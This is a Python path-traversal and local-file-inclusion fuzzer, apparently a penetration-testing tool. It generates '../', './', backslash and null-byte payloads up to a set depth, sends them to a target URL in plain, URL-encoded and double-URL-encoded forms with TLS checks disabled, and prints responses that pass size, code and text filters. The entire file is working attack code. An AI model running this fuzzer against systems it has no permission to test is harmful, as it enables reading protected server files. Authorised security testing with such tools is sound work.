import itertools
import requests
import getopt
import sys
import common
import urllib3


urllib3.disable_warnings()

DOT = "."
DDS = "../"
DS = "./"
SLASH = "/"
RSLASH = "\\"

def help():
    print("\t-u URL, --url=URL\tscan url")
    print("\t-p, --path=      \tdir or file")
    print("\t--depth=         \trecursion depth")
    print("\t--hcode=         \tHidden code separate [,]")
    print("\t--hsize=         \tHidden length content separate [,]")
    print("\t--htext=         \tHidden text separate [,]")
    print("\t-c, --cookie     \tset cookie separate [,]")
    print("EXAMPLES: ")    
    print("\tlfi_fuzz.py -u http://example.com -p test")
    print("\tlfi_fuzz.py --url=http://example.com --path=test")
    print("\tlfi_fuzz.py --url=http://example.com --path=test --hcode=404,502")
    print("\tlfi_fuzz.py --url=http://example.com --path=test --hsize=612")
    print("\tlfi_fuzz.py -u http://example.com -p test --cookie session=test,path=/")


def lfi_fuzz(url, path, hcode=(), hsize=(), htext=(), cookie=None, depth=8):
    DDS = "../"
    DS = "./"
    SLASH = "/"
    RSLASH = "\\"
    DOTS = "..."
 
    payloads_lfi = [f"{DOTS}", f"{DDS}", f"{DS}", f"{SLASH}", f"{RSLASH}"]
    
    for n in range(1, depth + 1):             
        for p in itertools.product(payloads_lfi, repeat=n):
            payloads = [f"{''.join(p)}", f"{''.join(p)}{path}", f"{''.join(p)}{path}{''.join(p)}", f"{''.join(p)}%00", f"{''.join(p)}{path}%00", f"{''.join(p)}{path}{''.join(p)}%00"]
            for payload in payloads:
                resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f" {url}{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
                    
                # URLENCODE
                resp = requests.get(f"{url}{common.urlencode(payload)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)            
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f" {url}{common.urlencode(payload)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
                resp = requests.get(f"{url}{common.urlencode(payload)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f" {url}{common.urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))                
                    
                # DOUBLE URLENCODE
                resp = requests.get(f"{url}{common.double_urlencode(payload)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f" {url}{common.double_urlencode(payload)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
                resp = requests.get(f"{url}{common.double_urlencode(payload)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f" {url}{common.double_urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))                

    
def main():
    url = None
    path = None
    cookie = None
    hcode = ()
    hsize = ()
    htext = ()
    depth = 8
    try:
        opts, args = getopt.getopt(sys.argv[1:], "u:p:d:c:", ["url=", "path=", "depth=", "hcode=", "hsize=", "htext=", "cookie="])
        for opt, arg in opts:            
            if opt in ("-u", "--url"):                    
                url = arg
            elif opt in ("-p", "--path"):                    
                path = arg
            elif opt in ("--depth"):                    
                depth = int(arg)
            elif opt in ("--hcode"):                    
                hcode = tuple(map(int, arg.split(",")))
            elif opt in ("--hsize"):                    
                hsize = tuple(map(int, arg.split(",")))
            elif opt in ("--htext"):                    
                htext = tuple(map(str, arg.split(",")))
            elif opt in ("-c", "--cookie"):                    
                cookie = common.parse_cookie(arg)
            else:
                help()
                sys.exit(0)
    except getopt.GetoptError as err:
        help()
        sys.exit(0)
    except ValueError as e:
        print(e)
    try:
        if url is not None and path is not None:
            print("\n---------------")
            print("[!] LFI fuzzing")
            print("---------------\n")
            url = common.parse_url(url)
            lfi_fuzz(url, path, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, depth=depth)
        else:
            help()
    except KeyboardInterrupt:
        sys.exit(0)
    except requests.ConnectionError as e:
        print(e)
        sys.exit(0)
    except requests.Timeout as e:
        print(e)
        sys.exit(0)
    except requests.RequestException as e:
        print(e)
        sys.exit(0)

        
if __name__ == "__main__":
    main()
